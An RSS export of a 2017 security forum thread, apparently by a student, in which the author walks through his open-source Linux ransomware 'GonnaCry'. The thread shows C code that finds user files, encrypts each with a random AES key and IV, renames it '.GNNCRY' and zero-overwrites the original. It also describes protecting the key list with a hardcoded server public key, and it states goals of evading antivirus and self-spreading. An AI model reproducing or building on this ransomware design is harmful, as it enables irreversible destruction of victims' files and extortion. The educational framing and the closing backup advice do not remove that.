<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>How ransomware work&#39;s and GonnaCry linux ransomware</title>
    <link>https://0x00sec.org/t/how-ransomware-works-and-gonnacry-linux-ransomware/4594</link>
    <description>Hey you all !

Since my last [post](https://0x00sec.org/t/gonnacry-a-linux-ransomware/4467/2) here about the [GonnaCry ransomware](https://github.com/tarcisio-marinho/GonnaCry) got unlisted, i&#39;ve returned today to share the knowledge I acquire since may, developing this linux ransomware.

**Motivations**
Since the world wide spread of the wannacry ransomware in may 2017 affected so much countries and companies, I kept wondering: Is really hard to fuck with a company or person&#39;s life with a computer?
The answer is Yes, it&#39;s possible.
And ransomware is a computer virus so powerfull to do so.

**My background**
I am from Brazil and computer science student. 
When I started developing this ransomware I only knew Python as a programming language, this helped me to understanding the basics how a Operating System and Library&#39;s works. But further more I learned C because I wanted to know how stuff happens behind the [os python library](https://docs.python.org/2/library/os.html) and others as well.

```python
import os 
for a, b, c in os.walk(os.getcwd()):
   for file in c:
       print(os.path.join(file, a))
```

 With this simple Python code snippet you can find all user&#39;s file. LOL :stuck_out_tongue:
It feels powerfull to control your own computer with code.


**What this tutorial is not**

*  This isn&#39;t a &quot;how to fuck my enemy computer&quot; post.
* A step by step how to develop a computer virus.
* A ransomware that I can use to be criminal and get money from.
* Explanation how cryptography works (i will share some links below).

**What is this for?**

* Share the knowledge with those who want to learn programming and Computer security.
* To understand how a general purpose ransomware work&#39;s (without having to reverse engineer other compiled ransomwares).

# Lets Go!

From my point of view these are the things that a ransomware needs to do:

* A ransomware should be able to do his activity without being detected
and stopped.
* Encrypt the files on the computer, with no comming back!
* Only be able to recover files with the server private key.
* Use two cryptography algorithms (AES for files and RSA/ECC to secure keys).
* Encrypt files even if computer is offline or internet connection fall (and still no way to recover files).
* Use some tecnique/vulnerability to self-spread (Hard part :grimacing:).
* Not be caught by some anti-virus, even on linux.
* Low memory use, to not make computer slow with encryption overhead.
* handle iterruptions and a backup plan if the process is killed.

Other things that are not on this list are secondary concerns.

# Walkthrough 

Here is the start point of the ransomware: https://github.com/tarcisio-marinho/GonnaCry/blob/master/C/gonnacry.c
Let&#39;s walkthrought it.

First the ransomware needs to know some path&#39;s, such as the desktop directory path, trash, home, etc...
To get the user and home directory i will use some glibc librarys from [unistd.h](http://pubs.opengroup.org/onlinepubs/7908799/xsh/unistd.h.html) 

```
char * home = get_home_enviroment(); // /home/USER/
char * desktop = get_desktop_enviroment(home); // /home/USER/Desktop/
char * username = get_username(); USERNAME
char * trash = get_trash_path(home); // /home/USER/.local/share/Trash/
char * media = get_media_path(username); 
```


With the paths we can enter in each folder, find files inside it, create new files, whatever we want.

**First part - Finding the files**

Now the ransomware needs to be aware of the files it will encrypt.
With the find_files function it will add each file found to a [linked-list](http://www.geeksforgeeks.org/linked-list-set-1-introduction/) containing all files.
All the funcions are here: https://github.com/tarcisio-marinho/GonnaCry/blob/master/C/lib/func.c
This is a recursive function.
If finds a file, append to the [linked-list](http://www.geeksforgeeks.org/linked-list-set-1-introduction/).

```c
         /* If finds a file, append to the linked list */
         if(ent-&gt;d_type == 8){ // it&#39;s a file

            while(ext != NULL){ // check file extension

                if(strcmp(get_filename_ext(path_to_file), ext) == 0){
                    append(files, path_to_file, NULL, NULL); 
                    break;
                }
                ext = strtok(NULL, &quot; &quot;);
            }
```

if finds a directory, he recursivly calls find_files inside this new directory

```c
        }else if(ent-&gt;d_type == 4){ // it&#39;s a directory

            if(!(strcmp(ent-&gt;d_name, &quot;..&quot;) == 0 || strcmp(ent-&gt;d_name, &quot;.&quot;) == 0)){

                find_files(files, new_directory); // recursive call
               

            }
        }
```

At the end, the files linked-list will have the full path to the files that will probably be encrypted.


**Second part - Start Encryption**

Now, with the path of each file, the ransomware starts the encryption routine, called encrypt_files.

All crypto funcions here: https://github.com/tarcisio-marinho/GonnaCry/blob/master/C/lib/crypto.c

For each file in the list, he will try to open and create a new file.

```c
old = fopen(files-&gt;info[2], &quot;rb&quot;);
if(old != NULL){
    new_name = (char*) malloc(sizeof(char) * (strlen(files-&gt;info[2]) + 11));
    strcpy(new_name, files-&gt;info[2]);
    strcat(new_name, &quot;.GNNCRY&quot;);
    new = fopen(new_name, &quot;wb&quot;);
```

Generate a unique random key and IV for each file and call encrypt function(I let you guess what it does :slight_smile:). 

```c  
    iv = generate_key(16);
    key = generate_key(32);
    /* Where encryption really happens*/
    encrypt(old, new, key, iv);
```

After the encryption, now we need to shred the old file, to never come back.
Let&#39;s take a look at the shred function. 

```c
void *buf = malloc(BUF_SIZE); // allocate memory
memset(buf, 0, BUF_SIZE); // zero the memory
ssize_t ret = 0;
off_t shift = 0;
while((ret = write(fd, buf,
                  ((fsize - shift &gt;BUF_SIZE)?
                  BUF_SIZE:(fsize - shift)))) &gt; 0)
     shift += ret;
```

Now the old file bytes are overwritten with zeros, and then deleted.
Even with some recovery tool software, the original file is lost.

goto Second part - Start Encryption;       //This repeats for each file on the linked list.


**Third part - create Desktop file: enc_files.gc**

This file will help the decryptor to get the path, key and iv used to encrypt each file.
First field is the random Key, then the random IV and the file path.
It looks like this: 

&gt;     6.V5Aw?d&#39;b}{v$@AO(xr&#39;?!ptWW-qADy:3Zd;B3zGrvufrUCQ:/home/tarcisio/Desktop/15109580_1182532868480776_7528793872271394864_n.jpg.water
&gt;     uI5Lt2yC3OU@L}&#39;x&#39;mh3?m0&amp;B10(;(SS:J0#,5K3V)ob9p)%Z:/home/tarcisio/Desktop/allegro/projeto-allegro.odt.water
&gt;     &#39;k14!3X(OhjFOb(hiBSf$JV#jb@s9&#39;!j:Thhj&#39;O%nWyebj8j7:/home/tarcisio/Desktop/allegro/main.c.water
&gt;     VOpUQOfFqiHOdJCiw#aSE$c)R,K$PfPM:3Li(wp@im2Gpx5Vy:/home/tarcisio/Desktop/estruturas/RB/redblack.c.water
&gt;     PkJu-JhU-V@}cVzebO)&amp;!0&#39;i@11c;Tb@:bGpNOj7gj-CS-vQX:/home/tarcisio/Desktop/estruturas/avl/avl.c.water
&gt;     QUZnLi{uqX2whaQ&#39;.usK52!K8bO&amp;jf7b:%JC)Zihn5g0d7hpN:/home/tarcisio/Desktop/estruturas/B/B.c.water

**Important part**, this file needs to be encrypted with the server [public key](https://en.wikipedia.org/wiki/Public-key_cryptography), that is hardcoded to the ransomware.
If this file isnt encrypted, the user can decrypt the files easly.
I will not explain why its done like this, instead, computerphile made a video about this, I highly recommend you watch it: 

https://www.youtube.com/watch?v=pLluFxHrc30

**Final steps - free the memory allocated**

For this last part, we will need to free all the memory allocated by the files linked-list and also the path variables declared at the beginning.


     /* Free the linked lists*/
     destroy(&amp;files);
     destroy(&amp;encrypted);
     destroy(&amp;not_encrypted);

     /* Free the path variables */
     free(home);
     free(desktop);
     free(username);
     free(trash);
     free(media);
     free(test_path);


# Final thoughts 

Some functionalities needs to be added to this ransomware, but the basic structure is working.
Since there is two versions of the code, the Python version has more features than the C version that&#39;s being developed day by day.

Not all ransomwares works this way, some have their peculiarities and more features.

Ransomware like WannaCry and Petya, are much more complex.


# Recomendadtions

Always have backup.

Never pay the ransom.

Don&#39;t trust suspicious links 

There is no such thing as &quot;Impenetrable system&quot;

That&#39;s all folks ! :slight_smile: 


# Github project page:
https://github.com/tarcisio-marinho/GonnaCry


# Contact: 
https://twitter.com/tarcisiomarinh
https://www.facebook.com/OneDayUmay1</description>
    
    <lastBuildDate>Thu, 07 Dec 2017 21:15:43 +0000</lastBuildDate>
    <category>Malware</category>
    <atom:link href="https://0x00sec.org/t/how-ransomware-works-and-gonnacry-linux-ransomware/4594.rss" rel="self" type="application/rss+xml" />
      <item>
        <title>How ransomware work&#39;s and GonnaCry linux ransomware</title>
        <dc:creator><![CDATA[system]]></dc:creator>
        <description><![CDATA[
            <p>This topic was automatically closed after 30 days. New replies are no longer allowed.</p>
          <p><a href="https://0x00sec.org/t/how-ransomware-works-and-gonnacry-linux-ransomware/4594/3">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/how-ransomware-works-and-gonnacry-linux-ransomware/4594/3</link>
        <pubDate>Sun, 21 Jan 2018 00:42:23 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-4594-3</guid>
        <source url="https://0x00sec.org/t/how-ransomware-works-and-gonnacry-linux-ransomware/4594.rss">How ransomware work&#39;s and GonnaCry linux ransomware</source>
      </item>
      <item>
        <title>How ransomware work&#39;s and GonnaCry linux ransomware</title>
        <dc:creator><![CDATA[REal0day]]></dc:creator>
        <description><![CDATA[
            <p>VERY excited to play with this.<br>
Thanks for your contribution!</p>
          <p><a href="https://0x00sec.org/t/how-ransomware-works-and-gonnacry-linux-ransomware/4594/2">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/how-ransomware-works-and-gonnacry-linux-ransomware/4594/2</link>
        <pubDate>Thu, 07 Dec 2017 21:15:43 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-4594-2</guid>
        <source url="https://0x00sec.org/t/how-ransomware-works-and-gonnacry-linux-ransomware/4594.rss">How ransomware work&#39;s and GonnaCry linux ransomware</source>
      </item>
      <item>
        <title>How ransomware work&#39;s and GonnaCry linux ransomware</title>
        <dc:creator><![CDATA[tarcisio-marinho]]></dc:creator>
        <description><![CDATA[
            <p>Hey you all !</p>
<p>Since my last <a href="https://0x00sec.org/t/gonnacry-a-linux-ransomware/4467/2">post</a> here about the <a href="https://github.com/tarcisio-marinho/GonnaCry" rel="noopener nofollow ugc">GonnaCry ransomware</a> got unlisted, i’ve returned today to share the knowledge I acquire since may, developing this linux ransomware.</p>
<p><strong>Motivations</strong><br>
Since the world wide spread of the wannacry ransomware in may 2017 affected so much countries and companies, I kept wondering: Is really hard to fuck with a company or person’s life with a computer?<br>
The answer is Yes, it’s possible.<br>
And ransomware is a computer virus so powerfull to do so.</p>
<p><strong>My background</strong><br>
I am from Brazil and computer science student.<br>
When I started developing this ransomware I only knew Python as a programming language, this helped me to understanding the basics how a Operating System and Library’s works. But further more I learned C because I wanted to know how stuff happens behind the <a href="https://docs.python.org/2/library/os.html" rel="noopener nofollow ugc">os python library</a> and others as well.</p>
<pre><code class="lang-python">import os 
for a, b, c in os.walk(os.getcwd()):
   for file in c:
       print(os.path.join(file, a))
</code></pre>
<p>With this simple Python code snippet you can find all user’s file. LOL <img src="https://0x00sec.org/images/emoji/twitter/stuck_out_tongue.png?v=12" title=":stuck_out_tongue:" class="emoji" alt=":stuck_out_tongue:" loading="lazy" width="20" height="20"><br>
It feels powerfull to control your own computer with code.</p>
<p><strong>What this tutorial is not</strong></p>
<ul>
<li>This isn’t a “how to fuck my enemy computer” post.</li>
<li>A step by step how to develop a computer virus.</li>
<li>A ransomware that I can use to be criminal and get money from.</li>
<li>Explanation how cryptography works (i will share some links below).</li>
</ul>
<p><strong>What is this for?</strong></p>
<ul>
<li>Share the knowledge with those who want to learn programming and Computer security.</li>
<li>To understand how a general purpose ransomware work’s (without having to reverse engineer other compiled ransomwares).</li>
</ul>
<h1><a name="lets-go-1" class="anchor" href="https://0x00sec.org#lets-go-1"></a>Lets Go!</h1>
<p>From my point of view these are the things that a ransomware needs to do:</p>
<ul>
<li>A ransomware should be able to do his activity without being detected<br>
and stopped.</li>
<li>Encrypt the files on the computer, with no comming back!</li>
<li>Only be able to recover files with the server private key.</li>
<li>Use two cryptography algorithms (AES for files and RSA/ECC to secure keys).</li>
<li>Encrypt files even if computer is offline or internet connection fall (and still no way to recover files).</li>
<li>Use some tecnique/vulnerability to self-spread (Hard part <img src="https://0x00sec.org/images/emoji/twitter/grimacing.png?v=12" title=":grimacing:" class="emoji" alt=":grimacing:" loading="lazy" width="20" height="20">).</li>
<li>Not be caught by some anti-virus, even on linux.</li>
<li>Low memory use, to not make computer slow with encryption overhead.</li>
<li>handle iterruptions and a backup plan if the process is killed.</li>
</ul>
<p>Other things that are not on this list are secondary concerns.</p>
<h1><a name="walkthrough-2" class="anchor" href="https://0x00sec.org#walkthrough-2"></a>Walkthrough</h1>
<p>Here is the start point of the ransomware: <a href="https://github.com/tarcisio-marinho/GonnaCry/blob/master/C/gonnacry.c" rel="noopener nofollow ugc">https://github.com/tarcisio-marinho/GonnaCry/blob/master/C/gonnacry.c</a><br>
Let’s walkthrought it.</p>
<p>First the ransomware needs to know some path’s, such as the desktop directory path, trash, home, etc…<br>
To get the user and home directory i will use some glibc librarys from <a href="http://pubs.opengroup.org/onlinepubs/7908799/xsh/unistd.h.html" rel="noopener nofollow ugc">unistd.h</a></p>
<pre><code class="lang-auto">char * home = get_home_enviroment(); // /home/USER/
char * desktop = get_desktop_enviroment(home); // /home/USER/Desktop/
char * username = get_username(); USERNAME
char * trash = get_trash_path(home); // /home/USER/.local/share/Trash/
char * media = get_media_path(username); 
</code></pre>
<p>With the paths we can enter in each folder, find files inside it, create new files, whatever we want.</p>
<p><strong>First part - Finding the files</strong></p>
<p>Now the ransomware needs to be aware of the files it will encrypt.<br>
With the find_files function it will add each file found to a <a href="http://www.geeksforgeeks.org/linked-list-set-1-introduction/" rel="noopener nofollow ugc">linked-list</a> containing all files.<br>
All the funcions are here: <a href="https://github.com/tarcisio-marinho/GonnaCry/blob/master/C/lib/func.c" rel="noopener nofollow ugc">https://github.com/tarcisio-marinho/GonnaCry/blob/master/C/lib/func.c</a><br>
This is a recursive function.<br>
If finds a file, append to the <a href="http://www.geeksforgeeks.org/linked-list-set-1-introduction/" rel="noopener nofollow ugc">linked-list</a>.</p>
<pre><code class="lang-c">         /* If finds a file, append to the linked list */
         if(ent-&gt;d_type == 8){ // it's a file

            while(ext != NULL){ // check file extension

                if(strcmp(get_filename_ext(path_to_file), ext) == 0){
                    append(files, path_to_file, NULL, NULL); 
                    break;
                }
                ext = strtok(NULL, " ");
            }
</code></pre>
<p>if finds a directory, he recursivly calls find_files inside this new directory</p>
<pre><code class="lang-c">        }else if(ent-&gt;d_type == 4){ // it's a directory

            if(!(strcmp(ent-&gt;d_name, "..") == 0 || strcmp(ent-&gt;d_name, ".") == 0)){

                find_files(files, new_directory); // recursive call
               

            }
        }
</code></pre>
<p>At the end, the files linked-list will have the full path to the files that will probably be encrypted.</p>
<p><strong>Second part - Start Encryption</strong></p>
<p>Now, with the path of each file, the ransomware starts the encryption routine, called encrypt_files.</p>
<p>All crypto funcions here: <a href="https://github.com/tarcisio-marinho/GonnaCry/blob/master/C/lib/crypto.c" rel="noopener nofollow ugc">https://github.com/tarcisio-marinho/GonnaCry/blob/master/C/lib/crypto.c</a></p>
<p>For each file in the list, he will try to open and create a new file.</p>
<pre><code class="lang-c">old = fopen(files-&gt;info[2], "rb");
if(old != NULL){
    new_name = (char*) malloc(sizeof(char) * (strlen(files-&gt;info[2]) + 11));
    strcpy(new_name, files-&gt;info[2]);
    strcat(new_name, ".GNNCRY");
    new = fopen(new_name, "wb");
</code></pre>
<p>Generate a unique random key and IV for each file and call encrypt function(I let you guess what it does <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=12" title=":slight_smile:" class="emoji" alt=":slight_smile:" loading="lazy" width="20" height="20">).</p>
<pre><code class="lang-c">    iv = generate_key(16);
    key = generate_key(32);
    /* Where encryption really happens*/
    encrypt(old, new, key, iv);
</code></pre>
<p>After the encryption, now we need to shred the old file, to never come back.<br>
Let’s take a look at the shred function.</p>
<pre><code class="lang-c">void *buf = malloc(BUF_SIZE); // allocate memory
memset(buf, 0, BUF_SIZE); // zero the memory
ssize_t ret = 0;
off_t shift = 0;
while((ret = write(fd, buf,
                  ((fsize - shift &gt;BUF_SIZE)?
                  BUF_SIZE:(fsize - shift)))) &gt; 0)
     shift += ret;
</code></pre>
<p>Now the old file bytes are overwritten with zeros, and then deleted.<br>
Even with some recovery tool software, the original file is lost.</p>
<p>goto Second part - Start Encryption;       //This repeats for each file on the linked list.</p>
<p><strong>Third part - create Desktop file: enc_files.gc</strong></p>
<p>This file will help the decryptor to get the path, key and iv used to encrypt each file.<br>
First field is the random Key, then the random IV and the file path.<br>
It looks like this:</p>
<blockquote>
<pre><code>6.V5Aw?d'b}{v$@AO(xr'?!ptWW-qADy:3Zd;B3zGrvufrUCQ:/home/tarcisio/Desktop/15109580_1182532868480776_7528793872271394864_n.jpg.water
uI5Lt2yC3OU@L}'x'mh3?m0&amp;B10(;(SS:J0#,5K3V)ob9p)%Z:/home/tarcisio/Desktop/allegro/projeto-allegro.odt.water
'k14!3X(OhjFOb(hiBSf$JV#jb@s9'!j:Thhj'O%nWyebj8j7:/home/tarcisio/Desktop/allegro/main.c.water
VOpUQOfFqiHOdJCiw#aSE$c)R,K$PfPM:3Li(wp@im2Gpx5Vy:/home/tarcisio/Desktop/estruturas/RB/redblack.c.water
PkJu-JhU-V@}cVzebO)&amp;!0'i@11c;Tb@:bGpNOj7gj-CS-vQX:/home/tarcisio/Desktop/estruturas/avl/avl.c.water
QUZnLi{uqX2whaQ'.usK52!K8bO&amp;jf7b:%JC)Zihn5g0d7hpN:/home/tarcisio/Desktop/estruturas/B/B.c.water
</code></pre>
</blockquote>
<p><strong>Important part</strong>, this file needs to be encrypted with the server <a href="https://en.wikipedia.org/wiki/Public-key_cryptography" rel="noopener nofollow ugc">public key</a>, that is hardcoded to the ransomware.<br>
If this file isnt encrypted, the user can decrypt the files easly.<br>
I will not explain why its done like this, instead, computerphile made a video about this, I highly recommend you watch it:</p>
<p><a href="https://www.youtube.com/watch?v=pLluFxHrc30">How WanaCrypt Encrypts Your Files - Computerphile</a></p>

<p><strong>Final steps - free the memory allocated</strong></p>
<p>For this last part, we will need to free all the memory allocated by the files linked-list and also the path variables declared at the beginning.</p>
<pre><code> /* Free the linked lists*/
 destroy(&amp;files);
 destroy(&amp;encrypted);
 destroy(&amp;not_encrypted);

 /* Free the path variables */
 free(home);
 free(desktop);
 free(username);
 free(trash);
 free(media);
 free(test_path);
</code></pre>
<h1><a name="final-thoughts-3" class="anchor" href="https://0x00sec.org#final-thoughts-3"></a>Final thoughts</h1>
<p>Some functionalities needs to be added to this ransomware, but the basic structure is working.<br>
Since there is two versions of the code, the Python version has more features than the C version that’s being developed day by day.</p>
<p>Not all ransomwares works this way, some have their peculiarities and more features.</p>
<p>Ransomware like WannaCry and Petya, are much more complex.</p>
<h1><a name="recomendadtions-4" class="anchor" href="https://0x00sec.org#recomendadtions-4"></a>Recomendadtions</h1>
<p>Always have backup.</p>
<p>Never pay the ransom.</p>
<p>Don’t trust suspicious links</p>
<p>There is no such thing as “Impenetrable system”</p>
<p>That’s all folks ! <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=12" title=":slight_smile:" class="emoji" alt=":slight_smile:" loading="lazy" width="20" height="20"></p>
<h1><a name="github-project-page-5" class="anchor" href="https://0x00sec.org#github-project-page-5"></a>Github project page:</h1>
<aside class="onebox allowlistedgeneric" data-onebox-src="https://github.com/tarcisio-marinho/GonnaCry">
  <header class="source">
      <img src="https://github.githubassets.com/favicons/favicon.svg" class="site-icon" width="32" height="32">

      <a href="https://github.com/tarcisio-marinho/GonnaCry" target="_blank" rel="noopener nofollow ugc">GitHub</a>
  </header>

  <article class="onebox-body">
    <div class="aspect-image" style="--aspect-ratio:690/345;"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/e/4/e400172bb69083c80d6576114e5fefdf3b9940a3_2_690x345.png" class="thumbnail" data-dominant-color="E7E9EA" width="690" height="345" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/e/4/e400172bb69083c80d6576114e5fefdf3b9940a3_2_690x345.png, https://0x00sec.s3.amazonaws.com/optimized/3X/e/4/e400172bb69083c80d6576114e5fefdf3b9940a3_2_1035x517.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/e/4/e400172bb69083c80d6576114e5fefdf3b9940a3.png 2x"></div>

<h3><a href="https://github.com/tarcisio-marinho/GonnaCry" target="_blank" rel="noopener nofollow ugc">GitHub - tarcisio-marinho/GonnaCry: A Linux Ransomware</a></h3>

  <p>A Linux Ransomware. Contribute to tarcisio-marinho/GonnaCry development by creating an account on GitHub.</p>


  </article>

  <div class="onebox-metadata">
    
    
  </div>

  <div style="clear: both"></div>
</aside>

<h1><a name="contact-6" class="anchor" href="https://0x00sec.org#contact-6"></a>Contact:</h1>
<p><a href="https://twitter.com/tarcisiomarinh" class="onebox" target="_blank" rel="noopener nofollow ugc">https://twitter.com/tarcisiomarinh</a></p><aside class="onebox allowlistedgeneric" data-onebox-src="https://www.facebook.com/OneDayUmay1">
  <header class="source">
      <img src="https://0x00sec.s3.amazonaws.com/original/3X/d/0/d0abb2829d53d4e7b3ffc7149d5a9e4a65dd950f.png" class="site-icon" data-dominant-color="4EAAF4" width="32" height="32">

      <a href="https://www.facebook.com/OneDayUmay1" target="_blank" rel="noopener nofollow ugc">facebook.com</a>
  </header>

  <article class="onebox-body">
    <img src="https://0x00sec.s3.amazonaws.com/optimized/3X/6/f/6f66b954616d223e9a3922d0a06b2801fd1dedba_2_500x500.jpeg" class="thumbnail onebox-avatar" data-dominant-color="685643" width="500" height="500" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/6/f/6f66b954616d223e9a3922d0a06b2801fd1dedba_2_500x500.jpeg, https://0x00sec.s3.amazonaws.com/optimized/3X/6/f/6f66b954616d223e9a3922d0a06b2801fd1dedba_2_750x750.jpeg 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/6/f/6f66b954616d223e9a3922d0a06b2801fd1dedba.jpeg 2x">

<h3><a href="https://www.facebook.com/OneDayUmay1" target="_blank" rel="noopener nofollow ugc">Tarcísio Marinho</a></h3>

  <p>Tarcísio Marinho is on Facebook. Join Facebook to connect with Tarcísio Marinho and others you may know. Facebook gives people the power to share and makes the world more open and connected.</p>


  </article>

  <div class="onebox-metadata">
    
    
  </div>

  <div style="clear: both"></div>
</aside>

          <p><a href="https://0x00sec.org/t/how-ransomware-works-and-gonnacry-linux-ransomware/4594/1">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/how-ransomware-works-and-gonnacry-linux-ransomware/4594/1</link>
        <pubDate>Thu, 07 Dec 2017 01:33:31 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-4594-1</guid>
        <source url="https://0x00sec.org/t/how-ransomware-works-and-gonnacry-linux-ransomware/4594.rss">How ransomware work&#39;s and GonnaCry linux ransomware</source>
      </item>
  </channel>
</rss>
